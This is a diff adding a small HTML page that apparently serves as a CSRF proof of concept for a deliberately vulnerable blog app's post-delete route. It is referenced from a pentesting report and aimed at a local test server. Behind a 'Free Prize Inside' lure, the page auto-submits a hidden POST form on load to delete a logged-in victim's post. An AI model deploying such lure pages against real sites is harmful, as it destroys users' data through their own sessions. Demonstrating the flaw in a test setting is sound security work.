@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head><title>Free Prize Inside</title></head>
+<body>
+  <h1>Loading your prize...</h1>
+  <!--
+    CSRF PoC for VulnFix-BlogApp /post/delete/<id>, referenced from
+    docs/pentesting_report.md. This targets the vulnerable branch's delete
+    route, which has no CSRF token check. Host this page on any origin: if a
+    logged-in victim visits it, their session cookie is attached automatically
+    and their post is deleted, no click needed.
+
+    To use: check out the `vulnerable` branch, create a post, change the id
+    in the URL below to match, then open this file while logged in as that
+    post's author.
+  -->
+  <form id="csrf-form" action="http://127.0.0.1:5000/post/delete/15" method="POST">
+  </form>
+  <script>
+    document.getElementById('csrf-form').submit();
+  </script>
+</body>
+</html>
